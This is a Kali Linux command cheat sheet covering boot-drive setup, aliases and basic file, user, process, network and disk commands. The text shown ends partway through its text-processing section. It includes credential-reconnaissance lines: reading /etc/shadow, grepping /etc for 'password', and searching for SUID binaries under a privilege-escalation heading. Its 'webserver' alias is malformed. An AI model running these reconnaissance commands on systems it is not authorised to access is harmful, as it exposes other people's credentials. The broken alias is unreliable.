# 🐉 Kali Linux (A to Z) Commands

[![Kali Linux](https://img.shields.io/badge/Kali_Linux-Cyber_Security-557C94?logo=kalilinux&logoColor=white)](https://www.kali.org)
[![Penetration Tester](https://img.shields.io/badge/Penetration_Tester-E53935?logo=hackaday&logoColor=white)](#)
[![Security Researcher](https://img.shields.io/badge/Security_Researcher-1E88E5?logo=securityscorecard&logoColor=white)](#)
[![Ethical Hacking](https://img.shields.io/badge/Ethical_Hacking-FFA500?logo=protonvpn&logoColor=white)](#)
[![Networking](https://img.shields.io/badge/Networking-00ACC1?logo=cisco&logoColor=white)](#)
[![Terminal Commands](https://img.shields.io/badge/Terminal_Commands-2D3748?logo=linux&logoColor=white)](#)
[![Shell Bash](https://img.shields.io/badge/Shell-Bash-00C853?logo=gnubash&logoColor=white)](#)

## [⁠Kali Linux](https://www.kali.org/) is a Debian-based Linux distribution designed for `digital forensics` and `penetration testing`. Originally released in 2006 as `BackTrack`, the platform was completely rebuilt from scratch and debuted as `Kali Linux` on March 13, 2013. Later in 2016, it officially transitioned into a continuous rolling release model. It is actively maintained and funded by [⁠Offensive Security](https://www.offsec.com/).

> **⚠️ Disclaimer:** This guide is only for ethical hacking, CTF, and testing your own system.Using it on someone else's system without permission is illegal.

---


## 📚 Table of Contents

| ## | Topic / Section | ## | Topic / Section |
| :---: | :--- | :---: | :--- |
| **01** | [🧹 Pendrive Formatting](#1-pendrive-formatting) | **16** | [🗜️ Archive & Compression](#16-archive--compression) |
| **02** | [🚀 Ventoy & Normal Boot Setup](#2-ventoy--normal-boot-setup) | **17** | [🔑 SSH & Remote Access](#17-ssh--remote-access) |
| **03** | [🔄 Live USB Persistence Mode](#3-live-usb-persistence-mode) | **18** | [🕵️ Information Gathering](#18-information-gathering) |
| **04** | [💻 Terminal Header Customization](#4-terminal-header-customization) | **19** | [🌐 Network Scanning (Nmap)](#19-network-scanning-nmap) |
| **05** | [⚙️ Custom Command (Alias) Setup](#5-custom-command-alias-setup) | **20** | [🔍 Vulnerability Scanning](#20-vulnerability-scanning) |
| **06** | [⚙️ Basic Linux Commands](#6-basic-linux-commands) | **21** | [🕸️ Web Application Testing](#21-web-application-testing) |
| **07** | [📂 File & Directory Operations](#7-file--directory-operations) | **22** | [🔑 Password Attacks](#22-password-attacks) |
| **08** | [🔒 File Permissions & Ownership](#8-file-permissions--ownership) | **23** | [📡 Wireless Attacks](#23-wireless-attacks) |
| **09** | [👥 User & Group Management](#9-user--group-management) | **24** | [💥 Exploitation (Metasploit)](#24-exploitation-metasploit) |
| **10** | [⚡ Process Management](#10-process-management) | **25** | [🎯 Post Exploitation](#25-post-exploitation) |
| **11** | [🔌 Network Commands](#11-network-commands) | **26** | [🧬 Forensics & Reverse Engineering](#26-forensics--reverse-engineering) |
| **12** | [📦 Package Management](#12-package-management) | **27** | [🤖 Scripting & Automation](#27-scripting--automation) |
| **13** | [🛠️ Service Management](#13-service-management) | **28** | [🖥️ Environment & System Info](#28-environment--system-info) |
| **14** | [💾 Disk & Storage](#14-disk--storage) | **29** | [⏰ Cron Jobs & Scheduling](#29-cron-jobs--scheduling) |
| **15** | [📝 Text Processing](#15-text-processing) | **30** | [📝 Quick Cheat Sheet](#30-quick-cheat-sheet) |

---


## 1. Pendrive Formatting
> Insert a USB flash drive and format it

```bash
# For Windows
- Plug the USB drive into your computer.
- Press 'Win + E' and go to 'This PC' or Click 'This PC' on the 'Desktop'.
- Find your USB drive, right-click it and select Format.
- Choose 'exFAT' (recommended) and check Quick Format.
- Click Start, then click 'OK' on the warning popup.
- Wait for the 'Format Complete' message and click OK.

# For Linux
# Note: Replace 'sdx' with your actual USB drive letter (e.g., sdb, sdc)
- sudo fdisk /dev/sdx               # Open partition manager for your drive
- Type 'o' and press Enter          # Create a new empty DOS partition table
- Type 'n' and press Enter          # Add a new partition
- Type 'p' and press Enter          # Make it a primary partition
- Type '1' and press Enter          # Set partition number as 1
- Press Enter                       # Accept default first sector
- Press Enter                       # Accept default last sector
- Type 'w' and press Enter          # Write changes and exit fdisk

- sudo mkfs.vfat -F 32 /dev/sdx1    # Format the new partition as FAT32
- sudo fatlabel /dev/sdx1 "MY_USB"  # Set a custom label name for your drive
```


## 2. Ventoy & Normal Boot Setup
>  Create a Kali Linux bootable drive

```bash
# For Windows
# Rufus [USB drives bootable]
# https://rufus.ie/en/  [For Download]
- Plug in your 'USB Drive' into your computer.
- Open the 'Rufus Tool' with administrator privileges.
- Select Device                                 # Choose your connected USB drive from the top menu.
- Select ISO                                    # Click 'SELECT' and load your downloaded OS image file.
- Set Partition                                 # Choose GPT for modern UEFI or MBR for Legacy BIOS.
- Set File System                               # Select NTFS for Windows or FAT32 for Linux ISOs.
- Click Start                                   # Begin flashing (Warning: This wipes all USB data).
- Wait for 'READY'                              # Safely close Rufus once the green bar hits 100%.

# Ventoy [Multiple ISO file Bootable]
# https://www.ventoy.net/en/download.html [For Download | Windows/Linux Version]
- Download the Windows zip file (e.g., ventoy-x.x.xx-windows.zip) and extract it.
- Open the extracted folder and run 'Ventoy2Disk.exe'.
- Select your Device (USB Drive) from the dropdown menu.
- Click 'Install', then click 'Yes' twice on the warning popups to confirm.
- Copy your Kali Linux ISO file directly into the Ventoy USB drive partition.

# For Linux
- tar -xf ventoy-*.tar.gz                       # For Extract
- cd ventoy-*/                                  # Goto Folder

- sudo ./Ventoy2Disk.sh -i /dev/sdx             # For Command Line Bootable | sdx=pendrive_name
- Press 'y'                                     # For Permission
- Press 'y'                                     # For Permission
# or
- sudo ./VentoyWeb.sh                           # For Web UI Bootable
- http://127.0.0.1:24680                        # Goto->Select Pendrive->Install

- cp /path/to/kali_linux.iso /path/to/Ventoy/   # For Copy ISO File | Path=Check
```


## 3. Live USB Persistence Mode
> Create a USB drive with persistence mode

```bash
# For Windows
- Download and open 'Rufus' (https://rufus.ie).
- Device: Select your connected USB flash drive.
- Boot selection: Click 'SELECT' and choose your Kali Linux ISO file.
- Persistent partition size: Drag the slider to allocate space (minimum 4GB+ recommended).
- File system: Leave it as Large FAT32 (Default) or cluster size default.
- Target system: Select 'BIOS or UEFI'.
- Start: Click 'START'. If prompted, select 'Write in ISO Image mode' and click 'OK'.
- Finish: Wait until the status bar says 'READY', then close Rufus.

# For Linux
- lsblk                             # Identify Your Drive

# Copy ISO file into Pendrive. sdx=pendrive_name
- sudo dd if=/path/to/kali_linux.iso of=/dev/sdx bs=4M status=progress conv=fsync

- sudo fdisk /dev/sdx               # Open partition manager for your drive
- Type 'o' and press Enter          # Create a new empty DOS partition table
- Type 'n' and press Enter          # Add a new partition
- Type 'p' and press Enter          # Make it a primary partition
- Type '1' and press Enter          # Set partition number as 1
- Press Enter                       # Accept default first sector
- Press Enter                       # Accept default last sector
- Type 'w' and press Enter          # Write changes and exit fdisk

- sudo mkfs.ext4 -L persistence /dev/sdx3               # sdx3=partition_of_the_pendrive
- sudo mkdir -p /mnt/usb                                # usb=name_of_the_persistence_drive
- sudo mount /dev/sdx3 /mnt/usb                         # Mounts the USB partition
- echo "/ union" | sudo tee /mnt/usb/persistence.conf   # Enables persistence configuration
- sudo umount /mnt/usb                                  # Safely unmounts the drive
```


## 4. Terminal Header Customization
> Set the custom kali linux welcome terminal header

```bash
sudo nano ~/.zshrc		# Open the ZSH configuration file

# Define the text strings
line1="75 6E 6B 6E 6F 77 6E"
line2="[ there is no place like 127.0.0.1 ]"

# Center and print using the built-in $COLUMNS variable
printf "%*s\n" $(( (${#line1} + COLUMNS) / 2 )) "$(echo -e "\e[1;31m$line1\e[0m")"
printf "%*s\n" $(( (${#line2} + COLUMNS) / 2 )) "$(echo -e "\e[1;36m$line2\e[0m")"
echo ""

Press Ctrl + O          # Write out changes (Save)
Press Enter             # Confirm the file name
Press Ctrl + X          # Exit the Nano editor

source ~/.zshrc 	    # Reload the ZSH configuration file
```


## 5. Custom Command (Alias) Setup
> Set the custom user command

```bash
sudo nano ~/.zshrc			          # Open the ZSH configuration file

# Core Utilities
alias cls="clear"                     # Clear screen using the classic Windows command
alias q="exit"                        # Quick exit from the terminal with a single letter
alias c="cd .."                       # Go back up one directory level quickly

# System Management
alias update="sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y && sudo apt clean"
alias install="sudo apt install -y"                  # Now you can just type: install nmap

# Pentesting & Network Essentials
alias myip="curl -s https://ifconfig.me && echo ''"  # Instantly fetch your public/external IP address
alias localip="hostname -I | awk '{print \$1}'"      # Instantly grab your local network IP address
alias ports="sudo netstat -tulanp"                   # Check all active open ports and running services
alias listen="ss -tulpn | grep LISTEN"               # See exactly what services are listening on your machine
alias webserver="python3 -m http://server"           # Instantly host your current folder as a web server on port 8000

Press Ctrl + O                                       # Write out changes (Save)
Press Enter                                          # Confirm the file name
Press Ctrl + X                                       # Exit the Nano editor

source ~/.zshrc 	                                 # Reload the ZSH configuration file
```
### Some essentials commands
```bash
# For wsl or others(If needed)
sudo apt install kali-linux-default -y               # Install Kali Linux default tools
# or
sudo apt install kali-tools-top10 -y                 # Install top 10 pentesting tools
# or
sudo apt install kali-linux-everything -y            # Install ALL Kali tools (500+ tools)
# or
sudo apt install kali-linux-large -y                 # Install 200+ core security tools
# or
sudo apt install kali-tools-web -y                   # Web App Hacking er shob tools
sudo apt install kali-tools-wireless -y              # Wi-Fi Hacking er shob tools
sudo apt install kali-tools-passwords -y             # Password Cracking er shob tools

sudo apt autoremove -y && sudo apt clean             # Delete unneeded packages/dependencies & Clear downloaded archive files (.deb caches)

# If needed
sudo apt install git -y                              # For clone Github tools
sudo apt install curl wget -y                        # For download text or file

# For system information
sudo apt install fastfetch -y                        # Show the system information (alternative- neofetch, hyfetch)
fastfetch                                            # Run fastfetch

# For system power control
systemctl reboot / reboot                            # Reboot the system
systemctl poweroff / poweroff                        # Power off/Shutdown the system
```


## 6. Basic Linux Commands
> Terminal commands that you need from the very first day

### Navigation

```bash
# Show current directory
pwd
# Output: /home/kali

# Change the directory
cd /etc               # Absolute path
cd Documents          # Relative path
cd ~                  # Home directory
cd -                  # Previous directory
cd ../                # One above
cd ../../             # Two above

# Show directory content
ls                    # Basic list
ls -l                 # Long format (permission, size, date)
ls -a                 # Including hidden files (starting with a dot .)
ls -la                # Long format + hidden
ls -lh                # Human-readable size (KB, MB)
ls -lt                # Sort by modification time
ls -lS                # Sort by file size
ls -R                 # Recursive (including sub-folders)
ls -l /etc/           # Specific folder
ls *.txt              # Pattern match
```

### System Information

```bash
# System info
uname -a              # All Kernel and OS information
uname -r              # Kernel version only
uname -m              # Architecture (x86_64, arm)
hostname              # Show hostname
hostname -I           # Show IP address

# OS version
cat /etc/os-release   # Displays general OS distribution details
cat /etc/kali-version # Shows the specific Kali Linux version
lsb_release -a        # Prints all available LSB distribution info

# CPU info
lscpu                 # View CPU info summary
cat /proc/cpuinfo     # View detailed CPU logs
nproc                 # View CPU core count

# RAM info
free -h               # Human-readable
free -m               # In MB (Megabytes)
cat /proc/meminfo     # View raw memory details

# Uptime (how long the system has been running)
uptime                # View system uptime
uptime -p             # Pretty format: "up 2 hours, 30 minutes"

# Date & Time
date                        # View current date and time
date "+%Y-%m-%d %H:%M:%S"   # View formatted date and time
timedatectl                 # View time and timezone settings

# Who is logged in
who                    # View logged-in users
w                      # View active users and actions
whoami                 # View current user name
id                     # View UID, GID, and groups
```

### Basic Commands

```bash
# Clear the screen
clear                  # Clear terminal screen
Ctrl + L               # Shortcut to clear screen

# Command history
history                # All history
history 20             # Last 20
!234                   # Run command number 234 from history
!!                     # Run the last command again
!nmap                  # Run the last nmap command again
history -c             # Clear terminal history

# Echo
echo "Hello Kali"      # Print text to terminal
echo $HOME             # Variable value print
echo -n "No newline"   # Without a newline
echo -e "Line1\nLine2" # Escape sequence

# Alias
alias ll='ls -la'      # List all files with details
alias update='sudo apt update && sudo apt upgrade -y' # System update and upgrade
unalias ll             # Alias remove

# Which command is used to locate a file
which nmap             # Find nmap binary path
which python3          # Find python3 binary path
whereis nmap           # Find binary, manual, and source
type nmap              # Check if command is built-in

# Manual page (documentation)
man nmap               # View nmap manual page
man -k keyword         # Search manual pages by keyword
info nmap              # View nmap info documentation

# Show command output page by page
man nmap | less        # View nmap manual page with scrolling
cat /etc/passwd | more # View passwd file page by page

# Calculator
bc                     # Interactive calculator
echo "2^10" | bc       # 1024
expr 5 + 3             # Simple math
```


## 7. File & Directory Operations
> Manage files and folders cleanly using optimized core CLI utilities

### Show and create file

```bash
# Create file(s)
touch newfile.txt               # Empty file
touch file1.txt file2.txt       # Multiple files
touch -t 202401011200 file.txt  # Using a specific timestamp

# Show File(s)
cat file.txt                    # Print the entire file
cat -n file.txt                 # With line number
cat file1.txt file2.txt         # Multiple file concatenate

# Show page by page
less file.txt                   # Navigate: ↑↓, q=quit, /=search
more file.txt                   # Older, less features

# Show first N line
head file.txt                   # Default: 10 lines
head -5 file.txt                # First 5 line
head -c 100 file.txt            # First 100 byte

# Show last N line
tail file.txt                   # Default: 10 lines
tail -5 file.txt                # Last 5 line
tail -f /var/log/syslog         # Real-time follow (log monitoring)
tail -f -n 50 file.log          # Last 50 line + follow

# Show file type
file document.pdf               # Check PDF file type
file /bin/bash                  # Check binary file type
file image.jpg                  # Check image file type

# File size
wc file.txt                     # Lines, words, bytes
wc -l file.txt                  # Only lines
wc -w file.txt                  # Only words
wc -c file.txt                  # Only bytes
```

### Create and delete directory

```bash
# Create directory
mkdir mydir                        # Create a new directory
mkdir -p parent/child/grandchild   # Create nested directory
mkdir dir1 dir2 dir3               # Multiple directory

# Copy
cp file.txt backup.txt             # File copy
cp -r folder/ backup/              # Folder copy (recursive)
cp -rp folder/ backup/             # With preserve permission
cp -v file.txt backup.txt          # With verbose output
cp *.txt /backup/                  # Pattern copy

# Move / Rename
mv oldname.txt newname.txt         # Rename
mv file.txt /tmp/                  # Move
mv -v *.log /var/logs/             # Verbose move

# Delete
rm file.txt                        # File delete
rm -f file.txt                     # Force without confirmation
rm -r folder/                      # Folder delete (recursive)
rm -rf folder/                     # Force recursive ⚠️
rm -i file.txt                     # Interactive mode (prompts for confirmation)
rmdir emptydir/                    # Remove empty directories only

# Creating links
ln -s /etc/hosts hosts_link        # Symbolic (soft) link
ln original.txt hardlink.txt       # Hard link
ls -la hosts_link                  # View link details
readlink hosts_link                # View the link target path
```

### File Search

```bash
# Using 'find'—the most powerful search command
find /home -name "*.txt"                 # Search by name
find / -name "passwd"                    # Search the entire system
find . -name "*.py" -type f              # File type
find . -type d -name "config"            # Search for directories only
find / -size +100M                       # Search for files larger than 100MB
find / -size -1k                         # Search for files smaller than 1KB
find / -mtime -7                         # Find files modified in the last 7 days
find / -atime -1                         # Find files accessed in the last 1 day
find / -newer reference.txt              # Find files modified after the reference file
find / -perm 777                         # Find files with 777 permissions
find / -perm /4000                       # Find files with SUID bit set
find / -user root                        # Find files owned by root
find / -group sudo                       # Find files belonging to the sudo group
find . -empty                            # Find empty files or directories
find . -name "*.log" -delete             # Find and delete matching files
find . -name "*.txt" -exec ls -la {} \;  # Find and execute a command on each file individually
find . -name "*.txt" -exec cat {} +      # Find and process all files together in one command

# locate — Fast but relies on a database
locate passwd                            # Search for files by name
locate -i passwd                         # Case-insensitive search
updatedb                                 # Update the search database

# which, whereis
which python3                            # Find python3 binary path
whereis nmap                             # Find nmap binary, manual, and source
```


## 8. File Permissions & Ownership
> Modify system file read-write-execute privileges and user/group ownership controls

```text
# Perm format: [Type][Owner][Group][Others]

Permission format: -rwxrwxrwx
                    │││││││││
                    ││││││└└└── Others: read, write, execute
                    │││└└└───── Group: read, write, execute
                    └└└──────── Owner: read, write, execute
                    │
                    └─────────── File type: - (file), d (dir), l (link)

# Numeric values: r=4, w=2, x=1
rwx = 4+2+1 = 7              # Read, Write, Execute
rw- = 4+2+0 = 6              # Read, Write
r-- = 4+0+0 = 4              # Read only
```

```bash
# View permissions
ls -l file.txt
# -rw-r--r-- 1 kali kali 1234 Jan 1 12:00 file.txt

# Change permissions
chmod 755 file.txt            # Set permissions to rwxr-xr-x (Owner: full, Group/Others: read/execute)
chmod 644 file.txt            # Set permissions to rw-r--r-- (Owner: read/write, Group/Others: read-only)
chmod 600 file.txt            # Set permissions to rw------- (for private keys)
chmod 777 file.txt            # Set permissions to rwxrwxrwx (full access for everyone [Owner, Group, Others] ⚠️)
chmod +x script.sh            # Add execute permission
chmod -w file.txt             # Remove write permission
chmod u+x file.txt            # Add execute permission for user/owner
chmod g-w file.txt            # Remove write permission for group
chmod o-rwx file.txt          # Remove all permissions for others
chmod -R 755 folder/          # Apply permissions recursively to all files and subfolders

# Change ownership
chown kali file.txt                   # Change owner
chown kali:kali file.txt              # Change both owner and group
chown -R kali:kali /var/www/html/     # Change ownership recursively
chgrp developers file.txt             # Change group only

# Special permissions
chmod u+s file                # SUID — executes with the privileges of the file owner
chmod g+s directory/          # SGID — new files in the directory inherit the group ownership
chmod +t /tmp/                # Sticky bit — only the file owner can delete the file

# umask (default permission)
umask                         # View current umask (e.g., 022)
umask 027                     # Set a new default umask value
```


## 9. User & Group Management
> Manage system user accounts, credentials and security group memberships

```bash
# User management
sudo adduser newuser                  # Create a user interactively
sudo useradd -m -s /bin/bash newuser  # Create a user non-interactively
sudo userdel newuser                  # Delete a user
sudo userdel -r newuser               # Delete a user along with their home directory
sudo passwd newuser                   # Set a password for the user
passwd                                # Change your own password

sudo usermod -aG sudo newuser         # Add the user to the sudo group
sudo usermod -s /bin/zsh newuser      # Change the user's default shell
sudo usermod -l newname oldname       # Change the username
sudo usermod -L newuser               # Lock the user account
sudo usermod -U newuser               # Unlock the user account

# Group management
sudo groupadd hackers                 # Create a new group
sudo groupdel hackers                 # Delete a group
sudo gpasswd -a user hackers          # Add a user to the group
sudo gpasswd -d user hackers          # Remove a user from the group

# View user information
id                                    # View current user information
id username                           # View specific user information
groups                                # View groups the current user belongs to
cat /etc/passwd                       # List all system users
cat /etc/shadow                       # View encrypted password hashes (root only)
cat /etc/group                        # List all system groups
getent passwd                         # Fetch entries from the user database
last                                  # View login history
lastlog                               # View the last login time for all users
who                                   # Show who is currently logged in
w                                     # Show who is logged in and what they are doing

# Privilege escalation
sudo command                          # Execute a command as root
sudo -i                               # Switch to an interactive root shell
sudo su -                             # Switch to the root user environment
su username                           # Switch to another user
sudo -l                               # List allowed sudo privileges for the current user
sudo -ll                              # View detailed list of sudo privileges
```


## 10. Process Management
> Monitor, control and terminate active system background tasks and running programs

```bash
# View processes
ps                               # View processes running in the current terminal
ps aux                           # View all running processes (BSD format)
ps -ef                           # View all running processes (UNIX format)
ps aux | grep python             # Search for a specific process
ps aux --sort=-%cpu              # Sort processes by CPU usage
ps aux --sort=-%mem              # Sort processes by memory usage

# Real-time monitoring
top                              # Real-time process monitor
htop                             # Better top (colors, mouse)
btop                             # Modern resource monitor
glances                          # System overview

# Kill processes
kill PID                         # Kill gracefully (SIGTERM)
kill -9 PID                      # Force kill instantly (SIGKILL)
kill -15 PID                     # Request graceful termination (SIGTERM - default)
killall firefox                  # Kill all processes by name
pkill python                     # Kill processes matching a pattern
xkill                            # Kill a GUI window by clicking on it

# Background/Foreground
command &                        # Run a command in the background
jobs                             # View background jobs
fg                               # Bring the most recent job to the foreground
fg %1                            # Bring a specific job to the foreground
bg                               # Resume a suspended job in the background
Ctrl + Z                         # Suspend the current foreground process
Ctrl + C                         # Interrupt and terminate the current process

# Process priority
nice -n 10 command               # Start a command with lower priority
renice 5 -p PID                  # Change the priority of a running process
# Priority: -20 (highest) to 19 (lowest)

# Process info
pstree                           # View processes in a tree format
lsof                             # List all open files and network connections
lsof -p PID                      # List files opened by a specific process
lsof -i :80                      # Find which process is using port 80
strace -p PID                    # Trace system calls of a running process
```


## 11. Network Commands
> Diagnose network connectivity, monitor interfaces and check open ports

### Network Configuration

```bash
# View network interfaces
ip addr                          # View IP addresses
ip addr show eth0                # View a specific interface
ip link                          # View link status
ifconfig                         # View network details using legacy command (net-tools)
ifconfig -a                      # View all available interfaces

# Assign IP address
sudo ip addr add 192.168.1.100/24 dev eth0   # Assign an IP address to a specific interface
sudo ip addr del 192.168.1.100/24 dev eth0   # Delete an IP address from a specific interface

sudo ip link set eth0 up                     # Enable the network interface
sudo ip link set eth0 down                   # Disable the network interface
sudo ifconfig eth0 up/down                   # Enable or disable the interface using legacy command

# Routing table
ip route                                     # View routing table
ip route show                                # View routing table details
route -n                                     # View routing table (old format)
sudo ip route add default via 192.168.1.1    # Set default gateway

# DNS configuration
cat /etc/resolv.conf                         # View configured DNS servers
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf # Set Google DNS as the name server

# Hostname
hostname                                     # View current hostname
sudo hostnamectl set-hostname kali-machine   # Change system hostname
cat /etc/hosts                               # View local DNS entries
```

### Network Testing & Monitoring

```bash
# Ping
ping google.com                  # Send continuous ping requests
ping -c 4 google.com             # Send exactly 4 ping requests
ping -i 0.5 google.com           # Send ping requests at 0.5 second intervals
ping6 google.com                 # Send IPv6 ping requests

# Traceroute
traceroute google.com            # Trace the route to the host
traceroute -n google.com         # Trace the route without resolving DNS
tracepath google.com             # Alternative tool to trace the network path

# DNS lookup
nslookup google.com              # Perform a standard DNS query
nslookup -type=MX google.com     # Query for Mail Exchanger (MX) records
dig google.com                   # View detailed DNS lookup results
dig google.com ANY               # Query for all available DNS records
dig @8.8.8.8 google.com          # Query using a specific DNS server (Google DNS)
dig +short google.com            # View a clean, short DNS answer
host google.com                  # Perform a simple DNS lookup
whois google.com                 # View domain registration details
whois 192.168.1.1                # View IP address registration information

# Port & Connection
netstat -tuln                    # View listening ports
netstat -tulnp                   # View listening ports along with their process details
ss -tuln                         # Faster alternative to view listening ports
ss -tulnp                        # View listening ports with process details using ss
ss -s                            # View overall network connection statistics

# View connections
netstat -an                      # View all active network connections
ss -an                           # View all active network connections (faster alternative)
lsof -i                          # List all active network connections
lsof -i TCP                      # List active TCP connections only
lsof -i :22                      # Find which process or user is connected to port 22

# Bandwidth monitoring
iftop                            # Real-time bandwidth
nethogs                          # Per-process bandwidth
nload                            # Interface bandwidth
iperf3 -s                        # Server mode (speed test)
iperf3 -c server_ip              # Client mode

# Download/Upload
wget https://example.com/file.zip
wget -O custom_name.zip URL      # Custom filename
wget -c URL                      # Resume download
wget --mirror -p website.com     # Website mirror
curl https://api.example.com     # HTTP request
curl -O URL                      # File download
curl -X POST -d "data" URL       # POST request
curl -H "Header: value" URL      # Custom header
curl -u user:pass URL            # Basic auth
curl -k https://URL              # SSL verify skip
```

### Firewall

```bash
# UFW (User-Friendly Firewall)
sudo ufw status                     # View firewall status
sudo ufw enable                     # Enable the firewall
sudo ufw disable                    # Disable the firewall
sudo ufw allow 22                   # Allow incoming traffic on port 22
sudo ufw allow ssh                  # Allow traffic by service name
sudo ufw deny 23                    # Deny incoming traffic on port 23
sudo ufw allow from 192.168.1.0/24  # Allow traffic from a specific IP range
sudo ufw delete allow 22            # Delete the rule that allows port 22
sudo ufw reset                      # Reset all firewall rules to default

# iptables (Advanced)
sudo iptables -L                                    # View active firewall rules
sudo iptables -L -n -v                              # View detailed rules with numeric IP addresses and ports
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # Allow incoming traffic on port 80 (HTTP)
sudo iptables -A INPUT -j DROP                      # Drop all incoming traffic that matches no rules
sudo iptables -F                                    # Flush and clear all firewall rules
sudo iptables-save > rules.txt                      # Save active firewall rules to a file
sudo iptables-restore < rules.txt                   # Restore firewall rules from a saved file
```


## 12. Package Management
> Install, update and remove system software packages and dependencies

```bash
# APT (Advanced Package Tool)
sudo apt update                  # Update the package list (ALWAYS run this first)
sudo apt upgrade                 # Upgrade all installed packages
sudo apt full-upgrade            # Perform a full upgrade (handles changing dependencies)
sudo apt dist-upgrade            # Perform a distribution upgrade

# Install
sudo apt install nmap            # Single package
sudo apt install nmap wireshark  # Multiple
sudo apt install -y nmap         # Auto yes
sudo apt install ./package.deb   # Local .deb file

# Remove
sudo apt remove nmap             # Remove the package (keeps configuration files)
sudo apt purge nmap              # Remove the package and delete its configuration files
sudo apt autoremove              # Remove unnecessary dependencies no longer needed
sudo apt autoclean               # Clean up the package cache by removing obsolete files

# Search & Info
apt search nmap                  # Search for a package by name or description
apt show nmap                    # Package info
apt list --installed             # Installed package
apt list --upgradable            # Upgrade available
dpkg -l                          # Installed package list
dpkg -l | grep nmap              # Specific package

# dpkg (low-level)
sudo dpkg -i package.deb         # .deb install
sudo dpkg -r package_name        # Remove
dpkg -l | grep package           # Check installed
dpkg --get-selections            # List all installed packages

# Kali-specific meta-packages
sudo apt install kali-tools-top10       # Top 10 tools
sudo apt install kali-tools-web         # Web tools
sudo apt install kali-tools-wireless    # Wireless tools
sudo apt install kali-linux-everything  # Install all tools ⚠️ large download size

# Snap packages
sudo snap install package        # Install a snap package
sudo snap remove package         # Remove a snap package
snap list                        # List all installed snap packages

# Python packages
pip install requests             # Install a specific Python package using pip
pip3 install scapy               # Install a specific Python package using pip3
pip install -r requirements.txt  # Install all packages listed in a requirements file
```


## 13. Service Management
>Start, stop, restart and enable system background services and daemons

```bash
# systemctl (systemd)
sudo systemctl start ssh              # Start the service
sudo systemctl stop ssh               # Stop the service
sudo systemctl restart ssh            # Restart the service
sudo systemctl reload ssh             # Reload configuration without stopping the process
sudo systemctl status ssh             # View service status
sudo systemctl enable ssh             # Enable auto-start at boot
sudo systemctl disable ssh            # Disable auto-start at boot
sudo systemctl is-active ssh          # Check if the service is currently active
sudo systemctl is-enabled ssh         # Check if the service is enabled to start at boot

# View all services
systemctl list-units --type=service                  # List all available services
systemctl list-units --type=service --state=running  # List only currently running services

# Common services in Kali Linux
sudo systemctl start postgresql       # Start the database service (required for Metasploit)
sudo systemctl start apache2          # Start the Apache web server
sudo systemctl start ssh              # Start the SSH server
sudo systemctl start mysql            # Start the MySQL database server

# View service logs
journalctl -u ssh                     # View logs specifically for the SSH service
journalctl -u ssh -f                  # Follow SSH service logs in real-time
journalctl -u ssh --since today       # View SSH service logs from today only
journalctl -n 50                      # View the last 50 lines of all system logs

# System log
tail -f /var/log/syslog               # System log
tail -f /var/log/auth.log             # Auth/login log
tail -f /var/log/kern.log             # Kernel log
cat /var/log/dpkg.log                 # Package install log
```


## 14. Disk & Storage
> Monitor disk space usage, manage partitions and check storage health

```bash
# View disk usage
df -h                            # View free disk space (human-readable format)
df -h /                          # View space for the root partition only
df -i                            # View inode usage instead of block usage

# View directory size
du -h folder/                    # View size of the folder and its subfolders
du -sh folder/                   # View summary size of the folder only
du -sh *                         # View the size of every item in the current folder
du -sh /* | sort -h              # View the size of all top-level directories sorted by size
du -sh /var/log                  # View the total size of the log directory

# Disk info
lsblk                            # View block devices
lsblk -f                         # View block devices along with their filesystems
fdisk -l                         # List partition tables (requires root)
sudo fdisk /dev/sdb              # Partition a disk interactively
parted /dev/sdb                  # Partition a disk using the advanced parted tool
blkid                            # View device UUIDs and filesystem types

# Mount operations
sudo mount /dev/sdb1 /mnt/usb    # Mount a device to a specific directory
sudo mount -o ro /dev/sdb1 /mnt/ # Mount a device as read-only
sudo umount /mnt/usb             # Unmount a device
mount                            # List all currently mounted filesystems

# Swap
free -h                          # View memory and swap usage (human-readable)
swapon --show                    # View active swap devices and files
sudo swapoff -a                  # Disable all swap space
sudo swapon -a                   # Enable all configured swap space

# Disk speed test
sudo hdparm -t /dev/sda                       # Read speed test
dd if=/dev/zero of=/tmp/test bs=1M count=100  # Write test
```


## 15. Text Processing
> These commands are essential for processing output in Kali Linux

### `grep` — Text Search

```bash
# Basic search
grep "root" /etc/passwd           # Search for a pattern in a file
grep "error" /var/log/syslog      # Search for a pattern in system logs
grep -i "root" /etc/passwd        # Case-insensitive search
grep -n "root" /etc/passwd        # Search and display line numbers
grep -v "root" /etc/passwd        # Invert match (show lines that do not match)
grep -c "root" /etc/passwd        # Display the count of matching lines
grep -l "error" *.log             # Display matching filenames only
grep -r "password" /etc/          # Perform a recursive search inside a directory
grep -w "root" /etc/passwd        # Match whole words only
grep -A 3 "error" file.txt        # Display the match plus 3 lines after it
grep -B 3 "error" file.txt        # Display the match plus 3 lines before it
grep -C 3 "error" file.txt        # Display the match plus 3 lines on both sides

# Regex
grep "^root" /etc/passwd          # Match lines starting with the pattern
grep "bash$" /etc/passwd          # Match lines ending with the pattern
grep "[0-9]" file.txt             # Match lines containing digits
grep -E "root|kali" /etc/passwd   # Use Extended Regular Expressions (OR logic)
grep -P "\d{4}" file.txt          # Use Perl-Compatible Regular Expressions (PCRE)

# Multiple files
grep "error" *.log                # Search across all .log files
grep -r "admin" /var/www/         # Recursively search a directory

# Using with Pipelines
ps aux | grep python              # Filter process list for a specific term
cat /etc/passwd | grep -v nologin # Filter out accounts without active login shells
nmap -sV target | grep "open"     # Extract only the open ports from scan output
```

### `awk` — Column Processing

```bash
# Basic
awk '{print $1}' file.txt               # Print the first column only
awk '{print $1, $3}' file.txt           # Print both the first and third columns
awk '{print NR, $0}' file.txt           # Print file content along with line numbers
awk 'NR==5' file.txt                    # Display the 5th line only
awk 'NR>=3 && NR<=7' file.txt           # Display lines from 3 to 7 inclusive

# Delimiter
awk -F: '{print $1}' /etc/passwd        # Split by colon and print the first field
awk -F: '{print $1, $6}' /etc/passwd    # Display the username and home directory
awk -F, '{print $2}' data.csv           # Split by comma and print the second column of a CSV file

# Condition
awk '$3 > 100' file.txt                 # Print lines where the 3rd column value is greater than 100
awk '/error/ {print}' file.txt          # Print lines containing the pattern "error"
awk '$1 == "root"' /etc/passwd          # Print lines where the first column strictly matches "root"

# Calculation
awk '{sum += $1} END {print sum}' numbers.txt
awk 'END {print NR}' file.txt           # Total line count
awk '{print NF}' file.txt               # Print the total field count for each line

# Practical
cat /etc/passwd | awk -F: '{print $1}'  # List all system usernames
